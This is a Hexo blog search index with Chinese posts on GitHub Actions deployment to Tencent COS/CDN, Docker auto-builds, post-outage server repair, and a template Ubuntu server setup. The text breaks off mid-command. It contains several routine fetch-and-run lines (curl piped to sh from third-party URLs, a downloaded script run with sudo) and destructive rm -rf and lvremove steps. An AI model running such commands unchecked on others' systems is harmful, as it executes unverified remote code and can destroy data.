<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>腾讯云cos+cdn对hexo的支持和github action对cos的支持</title>
      <link href="/2020/08/17/teng-xun-yun-cos-cdn-dui-hexo-de-zhi-chi-he-github-action-dui-cos-de-zhi-chi/"/>
      <url>/2020/08/17/teng-xun-yun-cos-cdn-dui-hexo-de-zhi-chi-he-github-action-dui-cos-de-zhi-chi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>由于github托管的blog在国内访问的很慢，所以为了优化一下，</p><p>决定在Tencent Cloud上搭建一个分站<br>共以下几点</p><ul><li>cos+cdn对静态网站对部署，并且配置https</li><li>github action添加自动部署到cos的job</li><li>使用google search 和百度站长</li></ul><h3 id="cos-cdn"><a href="#cos-cdn" class="headerlink" title="cos+cdn"></a>cos+cdn</h3><p>首先部署cos，这个很简单</p><ul><li><p>设置一下静态网站，选择强制开启https，添加下403之间跳到index.html<br><img src="/img/2020/08/17/staticweb_setting.png" alt="staticweb_setting"></p></li><li><p>然后域名管理里面打开默认CDN加速域名，并且配置好自定义CDN加速域名和自定义源站域名</p></li><li><p>可以选择开启日志管理，方便自己查看</p></li><li><p>存储桶访问权限为公有读私有写</p></li></ul><h3 id="cdn-https"><a href="#cdn-https" class="headerlink" title="cdn+https"></a>cdn+https</h3><h4 id="https"><a href="#https" class="headerlink" title="https:"></a>https:</h4><ul><li>cdn的界面里面，证书管理配好，用nginx格式的ssl证书，证书之间用免费的就行</li><li>回源协议选择https</li></ul><h4 id="cdn"><a href="#cdn" class="headerlink" title="cdn"></a>cdn</h4><ul><li>缓存过期配置我设置为全文件1分钟</li><li>开启回源跟随301/302配置</li><li>关闭Range回源配置</li><li>开启HTTP2.0配置和强制跳转</li></ul><p>自己走的一个最大的坑就是URL重写配置，里面写了一条<code>^.*/</code>到<code>/index.html</code>导致了302 301无限的循环，中间也去掉过并且等了几个小时，然后还是没有改变，第二天在去掉就神奇的好了，可能这就是cdn的神奇魔力吧。</p><h3 id="github-action对tencent-cloud的支持"><a href="#github-action对tencent-cloud的支持" class="headerlink" title="github action对tencent cloud的支持"></a>github action对tencent cloud的支持</h3><p>在action文件里面加上这几个step就行了</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">name</span><span class="token punctuation">:</span> CI<span class="token key atrule">on</span><span class="token punctuation">:</span>  <span class="token key atrule">push</span><span class="token punctuation">:</span>    <span class="token key atrule">branches</span><span class="token punctuation">:</span> <span class="token punctuation">[</span> master <span class="token punctuation">]</span><span class="token key atrule">jobs</span><span class="token punctuation">:</span>  <span class="token key atrule">build</span><span class="token punctuation">:</span>    <span class="token key atrule">runs-on</span><span class="token punctuation">:</span> ubuntu<span class="token punctuation">-</span>latest    <span class="token key atrule">env</span><span class="token punctuation">:</span>      <span class="token key atrule">local_dir</span><span class="token punctuation">:</span> ./public/      <span class="token key atrule">remote_dir</span><span class="token punctuation">:</span> /      <span class="token key atrule">thread</span><span class="token punctuation">:</span> <span class="token number">10</span>      <span class="token key atrule">region</span><span class="token punctuation">:</span> accelerate      <span class="token key atrule">bucket</span><span class="token punctuation">:</span> <span class="token string">""</span>      <span class="token key atrule">ignore</span><span class="token punctuation">:</span> <span class="token string">"./.git*,*.DS_Store"</span>    <span class="token key atrule">steps</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/checkout@v2    <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Set up Python      <span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/setup<span class="token punctuation">-</span>python@v1      <span class="token key atrule">with</span><span class="token punctuation">:</span>        <span class="token key atrule">python-version</span><span class="token punctuation">:</span> <span class="token number">3.6</span>    <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> install coscmd      <span class="token key atrule">run</span><span class="token punctuation">:</span> <span class="token punctuation">|</span><span class="token scalar string">        python -m pip install --upgrade pip        python -m pip install setuptools coscmd</span>    <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> upload to cos      <span class="token key atrule">run</span><span class="token punctuation">:</span> <span class="token punctuation">|</span><span class="token scalar string">        coscmd config -a "$&amp;#123;&amp;#123;secrets.TENCENTCLOUD_SECRET_ID&amp;#125;&amp;#125;" -s "$&amp;#123;&amp;#123;secrets.TENCENTCLOUD_SECRET_KEY&amp;#125;&amp;#125;" -b $bucket -r $region -m $thread         coscmd upload -r -s $local_dir $remote_dir --ignore "$ignore"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于github在国外，所以直接推送原始域名失败的概率还是很高的，所以开启储存桶的全球加速，使用<code>accelerate</code>进行上传<br>其中推送到cos只需要上传pulibc文件夹下面的文件就行，通过<code>diff -ruNa public .deploy_git &gt; ../1.txt</code>可以看到，他们的差异只存在于<code>.git</code>文件夹中</p>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github action </tag>
            
            <tag> hexo </tag>
            
            <tag> cos </tag>
            
            <tag> cdn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github action的一些用法及hexo自动部署</title>
      <link href="/2020/08/15/github-action-de-yi-xie-yong-fa-ji-hexo-zi-dong-bu-shu/"/>
      <url>/2020/08/15/github-action-de-yi-xie-yong-fa-ji-hexo-zi-dong-bu-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>主要用github action做了两个自动化部署</p><ul><li>github pages的自动部署</li><li>利用github仓库进行docker的自动build，并且定时跟新</li><li>利用docker镜像恢复dockerfile</li></ul><h2 id="github-pages的自动部署"><a href="#github-pages的自动部署" class="headerlink" title="github pages的自动部署"></a>github pages的自动部署</h2><h3 id="修改hexo的-config-yml"><a href="#修改hexo的-config-yml" class="headerlink" title="修改hexo的_config.yml"></a>修改hexo的_config.yml</h3><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">deploy</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> git  <span class="token comment" spellcheck="true">#repo: https://github.com/chnxyzz/chnxyzz.github.io.git</span>  <span class="token key atrule">repo</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//GITHUB_TOKEN@github.com/chnxyzz/chnxyzz.github.io.git  <span class="token key atrule">branch</span><span class="token punctuation">:</span> master  <span class="token key atrule">name</span><span class="token punctuation">:</span> chnxyzz  <span class="token key atrule">email</span><span class="token punctuation">:</span> 28676240+chnxyzz@users.noreply.github.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加github-action"><a href="#添加github-action" class="headerlink" title="添加github_action"></a>添加github_action</h3><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">name</span><span class="token punctuation">:</span> build and deploy<span class="token key atrule">on</span><span class="token punctuation">:</span>  <span class="token key atrule">push</span><span class="token punctuation">:</span>    <span class="token key atrule">branches</span><span class="token punctuation">:</span> master<span class="token key atrule">jobs</span><span class="token punctuation">:</span>  <span class="token key atrule">build</span><span class="token punctuation">:</span>    <span class="token key atrule">runs-on</span><span class="token punctuation">:</span> ubuntu<span class="token punctuation">-</span>latest    <span class="token key atrule">env</span><span class="token punctuation">:</span>      <span class="token key atrule">GITHUB_TOKEN</span><span class="token punctuation">:</span> $&amp;<span class="token comment" spellcheck="true">#123;&amp;#123;secrets.POST_TOKEN&amp;#125;&amp;#125;</span>    <span class="token key atrule">steps</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/checkout@v2      <span class="token punctuation">-</span> <span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/setup<span class="token punctuation">-</span>node@v1        <span class="token key atrule">with</span><span class="token punctuation">:</span>          <span class="token key atrule">node-version</span><span class="token punctuation">:</span> <span class="token number">14</span>          <span class="token key atrule">registry-url</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//registry.npmjs.org/      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> build and deploy        <span class="token key atrule">run</span><span class="token punctuation">:</span> <span class="token punctuation">|</span><span class="token scalar string">          npm install -g hexo-cli          npm install          sed -i "s/GITHUB_TOKEN/$&amp;#123;&amp;#123;secrets.POST_TOKEN&amp;#125;&amp;#125;/g" ./_config.yml          hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="docker自动部署"><a href="#docker自动部署" class="headerlink" title="docker自动部署"></a>docker自动部署</h2><p>给定dockerfile，就可以自动build并且push到dockerhub上</p><h3 id="docker官方用的"><a href="#docker官方用的" class="headerlink" title="docker官方用的"></a>docker官方用的</h3><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">name</span><span class="token punctuation">:</span> docker build CI<span class="token key atrule">on</span><span class="token punctuation">:</span>  <span class="token key atrule">push</span><span class="token punctuation">:</span>    <span class="token key atrule">branches</span><span class="token punctuation">:</span> <span class="token punctuation">[</span> master <span class="token punctuation">]</span><span class="token key atrule">jobs</span><span class="token punctuation">:</span>  <span class="token key atrule">build</span><span class="token punctuation">:</span>    <span class="token key atrule">runs-on</span><span class="token punctuation">:</span> ubuntu<span class="token punctuation">-</span>latest    <span class="token key atrule">steps</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/checkout@v2    <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> build and push      <span class="token key atrule">uses</span><span class="token punctuation">:</span> docker/build<span class="token punctuation">-</span>push<span class="token punctuation">-</span>action@v1      <span class="token key atrule">with</span><span class="token punctuation">:</span>        <span class="token key atrule">username</span><span class="token punctuation">:</span> $&amp;<span class="token comment" spellcheck="true">#123;&amp;#123; secrets.DOCKER_USERNAME &amp;#125;&amp;#125;</span>        <span class="token key atrule">password</span><span class="token punctuation">:</span> $&amp;<span class="token comment" spellcheck="true">#123;&amp;#123; secrets.DOCKER_PASSWORD &amp;#125;&amp;#125;</span>        <span class="token key atrule">repository</span><span class="token punctuation">:</span> xyzzpwn/hexo_dev        <span class="token key atrule">tags</span><span class="token punctuation">:</span> latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="自己写的，可以用于打上时间的tag，然后不断的叠加push"><a href="#自己写的，可以用于打上时间的tag，然后不断的叠加push" class="headerlink" title="自己写的，可以用于打上时间的tag，然后不断的叠加push"></a>自己写的，可以用于打上时间的tag，然后不断的叠加push</h3><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">name</span><span class="token punctuation">:</span> Docker Image CI<span class="token key atrule">on</span><span class="token punctuation">:</span>  <span class="token key atrule">push</span><span class="token punctuation">:</span>    <span class="token key atrule">branches</span><span class="token punctuation">:</span> <span class="token punctuation">[</span> master <span class="token punctuation">]</span>  <span class="token key atrule">schedule</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">cron</span><span class="token punctuation">:</span> <span class="token string">'50 23 * * 6'</span><span class="token key atrule">jobs</span><span class="token punctuation">:</span>  <span class="token key atrule">build</span><span class="token punctuation">:</span>    <span class="token key atrule">runs-on</span><span class="token punctuation">:</span> ubuntu<span class="token punctuation">-</span>latest    <span class="token key atrule">steps</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/checkout@v2    <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Build the Docker image      <span class="token key atrule">run</span><span class="token punctuation">:</span> <span class="token punctuation">|</span><span class="token scalar string">        sudo ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime;        sudo echo 'Asia/Shanghai' >/etc/timezone;        echo $&amp;#123;&amp;#123; secrets.DOCKER_PASSWORD &amp;#125;&amp;#125; | docker login --username $&amp;#123;&amp;#123; secrets.DOCKER_USERNAME &amp;#125;&amp;#125; --password-stdin        export con_name=xyzzpwn/hexo        export con_time_name=$con_name:$(date +%Y%m%d%H%M%S)        export con_relese_name=$con_name:latest        docker build . --file ./Dockerfile --tag $con_time_name        docker push $con_time_name        docker tag $con_time_name $con_relese_name        docker push $con_relese_name</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有时间希望能做成一个和build-push-action一样的即插即用的github action项目<br>并且可以把deploy github pages 拓展到push到各个仓库</p><h2 id="利用docker镜像恢复dockerfile"><a href="#利用docker镜像恢复dockerfile" class="headerlink" title="利用docker镜像恢复dockerfile"></a>利用docker镜像恢复dockerfile</h2><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><p>docker history 然后反转</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> $<span class="token comment" spellcheck="true"># -eq 1 ];then</span>        docker <span class="token function">history</span> --format <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123;.CreatedBy&amp;#125;&amp;#125; --no-trunc=true $1 |sed "s/\/bin\/sh\ -c\ \#(nop)\ //g"|sed "s/\/bin\/sh\ -c/RUN/g" | tac</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token string">"sh <span class="token variable">$0</span> Docker_image_name"</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="通过hash找docker镜像"><a href="#通过hash找docker镜像" class="headerlink" title="通过hash找docker镜像"></a>通过hash找docker镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker pull ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以有需要的时候把docker中所有常用的docker image名字收集起来，通过不断的docker pull来进行尝试<br>还有一种方法</p><pre class="line-numbers language-bash"><code class="language-bash">docker pull ubuntu --all-tags<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把所有镜像下载本地，做成一个数据库，不过太耗费流量了。而且实时性不强。</p>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo auto deploy </tag>
            
            <tag> github action </tag>
            
            <tag> docker auto build </tag>
            
            <tag> docker reverse dockerfile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修复停电后服务器故障</title>
      <link href="/2020/08/14/xiu-fu-ting-dian-hou-fu-wu-qi-gu-zhang/"/>
      <url>/2020/08/14/xiu-fu-ting-dian-hou-fu-wu-qi-gu-zhang/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>停电后，esxi重启，出现以下问题</p><ul><li>vsphere center到重做日志已损坏</li><li>centos7 system损坏</li><li>上台centos7部署的nextcloud中的mariadb损坏</li></ul><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="vsphere-center"><a href="#vsphere-center" class="headerlink" title="vsphere center"></a>vsphere center</h2><p>直接采用快照回滚，然后重新连接esxi，修改配置，进行快照</p><h2 id="centos7-system损坏"><a href="#centos7-system损坏" class="headerlink" title="centos7 system损坏"></a>centos7 system损坏</h2><p>为保险起见，先用kali——live-cd挂载进去，拿到了data中的数据，发现数据可以拿出，放到其他上面备份，发现系统盘不可读<br>经过检查，是/dev/mapper/centos-root出了问题<br>开机加入rescue模式<br>或者</p><pre class="line-numbers language-bash"><code class="language-bash">rw single<span class="token operator">=</span>/sysroot/bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后使用xfs_repair修复</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -l /dev/mapper<span class="token punctuation">;</span>xfs_repair /dev/mapper/centos-root<span class="token punctuation">;</span>xfs_repair -L /dev/mapper/centos-root<span class="token punctuation">;</span>init 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="docker部署的mariadb损坏"><a href="#docker部署的mariadb损坏" class="headerlink" title="docker部署的mariadb损坏"></a>docker部署的mariadb损坏</h2><p>首先修改docker-compose.yml</p><pre class="line-numbers language-bash"><code class="language-bash">services:  db:    image: mariadb    <span class="token comment" spellcheck="true">#command: --transaction-isolation=READ-COMMITTED --binlog-format=ROW</span>    command: --innodb-force-recovery<span class="token operator">=</span>2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入备份nextcloud数据库</p><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">exec</span> -it nextcloud_db_1 /bin/bashmysql -uroot -pmysqlcheck --all-databases -uroot -pmysqldump -h 127.0.0.1 -u root -ppassword nextcloud <span class="token operator">></span> nextcloud.sql<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改回docker-compose.yml，并删除一些脏数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rm</span> -i ib*<span class="token punctuation">;</span><span class="token function">rm</span> core.*<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这时候mariadb就可以正常启动了，先删除nextcloud数据库的文件然后恢复数据库</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rm</span> -rf ./nextcloud/*mysql -uroot -pdrop database nextcloud<span class="token punctuation">;</span>create database nextcloud<span class="token punctuation">;</span>use nextcloud<span class="token punctuation">;</span><span class="token function">source</span> nextcloud.sql<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修复全部完成,打好快照备用。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有时间应该弄一个自动叠带快照的脚本，每隔一定时间自动打一次快照，并且自动保存最新的3-5个快照。</p>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux server </tag>
            
            <tag> xfs repair </tag>
            
            <tag> mariadb repair </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一台用于即时克隆的母服务器的基本配置</title>
      <link href="/2020/08/14/yi-tai-yong-yu-ji-shi-ke-long-de-mu-fu-wu-qi-de-ji-ben-pei-zhi/"/>
      <url>/2020/08/14/yi-tai-yong-yu-ji-shi-ke-long-de-mu-fu-wu-qi-de-ji-ben-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>对于每种服务器都做一个母服务器，在需要的时候通过instant clone进行快速复制<br>留一个记录，每次做母机按这个整合脚本就行<br>现在用的是ubuntu server 20.04.01,其他的应该替换参数什么的就OK了<br>对于母服务器就有如下要求</p><ul><li>基本的配置完成</li><li>基本的软件有安装</li><li>母服务的操作很顺手</li><li>母服务器安全性有保障</li><li>母服务上软件是能更新到最新</li></ul><h3 id="基本的配置完成"><a href="#基本的配置完成" class="headerlink" title="基本的配置完成"></a>基本的配置完成</h3><h4 id="swap分区"><a href="#swap分区" class="headerlink" title="swap分区"></a>swap分区</h4><p>目前一般设成2g或者4g，需要跑大型程序再改</p><h5 id="原swap分区是swapfile"><a href="#原swap分区是swapfile" class="headerlink" title="原swap分区是swapfile"></a>原swap分区是swapfile</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> swapfile<span class="token operator">=</span>/swap.img<span class="token punctuation">;</span><span class="token function">sudo</span> swapoff <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">dd</span> if<span class="token operator">=</span>/dev/zero of<span class="token operator">=</span><span class="token variable">$swapfile</span> bs<span class="token operator">=</span>4k count<span class="token operator">=</span>512k<span class="token punctuation">;</span><span class="token function">sudo</span> mkswap <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> swapon <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="原swap分区是partition"><a href="#原swap分区是partition" class="headerlink" title="原swap分区是partition"></a>原swap分区是partition</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> swapfile<span class="token operator">=</span>/dev/mapper/centos-swap<span class="token punctuation">;</span><span class="token function">sudo</span> swapoff <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> lvreduce -L -6G <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> mkswap <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> swapon <span class="token variable">$swapfile</span><span class="token punctuation">;</span>lsblk<span class="token punctuation">;</span><span class="token function">cp</span> -r /home/ /homebak/<span class="token punctuation">;</span><span class="token function">umount</span> /home<span class="token punctuation">;</span>lvremove /dev/mapper/centos-home<span class="token punctuation">;</span>vgdisplay<span class="token punctuation">;</span>lvcreate -L 29G -n home centos<span class="token punctuation">;</span>mkfs.xfs /dev/centos/home<span class="token punctuation">;</span><span class="token function">mount</span> /dev/centos/home /home<span class="token function">cp</span> -r /homebak/* /home/<span class="token punctuation">;</span><span class="token function">rm</span> -rf /homebak<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/us.archive.ubuntu.com/mirrors.aliyun.com/g'</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">sed</span> -i <span class="token string">'s/cn.archive.ubuntu.com/mirrors.aliyun.com/g'</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">sed</span> -i <span class="token string">'s/archive.ubuntu.com/mirrors.aliyun.com/g'</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">sed</span> -i <span class="token string">'s/security.ubuntu.com/mirrors.aliyun.com/g'</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">apt-get</span> update<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/http:/https:/g'</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="换时区"><a href="#换时区" class="headerlink" title="换时区"></a>换时区</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'Asia/Shanghai'</span> <span class="token operator">></span>/etc/timezone<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="修改主机名称"><a href="#修改主机名称" class="headerlink" title="修改主机名称"></a>修改主机名称</h4><p>一般在centos等需要</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> ubuntu_server_200401_x64 <span class="token operator">></span> /etc/hostname<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="基本的软件有安装"><a href="#基本的软件有安装" class="headerlink" title="基本的软件有安装"></a>基本的软件有安装</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> DEBIAN_FRONTEND<span class="token operator">=</span>noninteractive<span class="token punctuation">;</span><span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">sudo</span> <span class="token function">wget</span> curl unzip netcat autojump <span class="token function">unrar</span> net-tools vim <span class="token function">bash</span> zsh <span class="token function">git</span> -y<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>oh-my-zsh不能少</p><pre class="line-numbers language-bash"><code class="language-bash">sh -c <span class="token string">"<span class="token variable"><span class="token variable">$(</span>curl -fsSL https://raw.githubusercontent.com/chnxyzz/oh-my-zsh/master/tools/install.sh<span class="token variable">)</span></span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="母服务器安全性有保障"><a href="#母服务器安全性有保障" class="headerlink" title="母服务器安全性有保障"></a>母服务器安全性有保障</h3><h4 id="ssh采用公钥登陆"><a href="#ssh采用公钥登陆" class="headerlink" title="ssh采用公钥登陆"></a>ssh采用公钥登陆</h4><pre class="line-numbers language-bash"><code class="language-bash">curl https://github.com/chnxyzz.keys <span class="token operator">>></span> ~/.ssh/authorized_keys<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">chmod</span> 600 ~/.ssh/authorized_keys<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="关闭ssh密码登陆"><a href="#关闭ssh密码登陆" class="headerlink" title="关闭ssh密码登陆"></a>关闭ssh密码登陆</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/#PasswordAuthentication yes/PasswordAuthentication no/g'</span> /etc/ssh/sshd_config<span class="token punctuation">;</span>server sshd restart<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="母服务上软件是能跟新到最新"><a href="#母服务上软件是能跟新到最新" class="headerlink" title="母服务上软件是能跟新到最新"></a>母服务上软件是能跟新到最新</h3><p>由于server的更新不是很频繁，所以可以手动，或者脚本crontab更新</p><h2 id="附加的常用场景"><a href="#附加的常用场景" class="headerlink" title="附加的常用场景"></a>附加的常用场景</h2><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h4 id="官方安装"><a href="#官方安装" class="headerlink" title="官方安装"></a>官方安装</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> docker.io<span class="token punctuation">;</span><span class="token function">sudo</span> curl -sSL https://get.daocloud.io/docker <span class="token operator">|</span> sh<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">usermod</span> -aG docker <span class="token variable">$USER</span><span class="token punctuation">;</span>curl -o docker_proxy.py https://raw.githubusercontent.com/chnxyzz/linux_install/master/docker/docker_proxy.py <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python3 docker_proxy.py <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> docker_proxy.py<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="利用阿里云加速安装"><a href="#利用阿里云加速安装" class="headerlink" title="利用阿里云加速安装"></a>利用阿里云加速安装</h4><h5 id="debian系"><a href="#debian系" class="headerlink" title="debian系"></a>debian系</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> want_os<span class="token operator">=</span>debian<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> apt-transport-https ca-certificates curl software-properties-common gnupg2<span class="token punctuation">;</span>curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/<span class="token variable">$want_os</span>/gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key add -<span class="token function">sudo</span> add-apt-repository <span class="token string">"deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/<span class="token variable">$want_os</span> <span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> stable"</span><span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> -y update<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> docker-ce<span class="token punctuation">;</span><span class="token function">sudo</span> systemctl start docker<span class="token punctuation">;</span><span class="token function">sudo</span> systemctl <span class="token function">enable</span> docker<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="centos系"><a href="#centos系" class="headerlink" title="centos系"></a>centos系</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> -y yum-utils device-mapper-persistent-data lvm2<span class="token function">sudo</span> 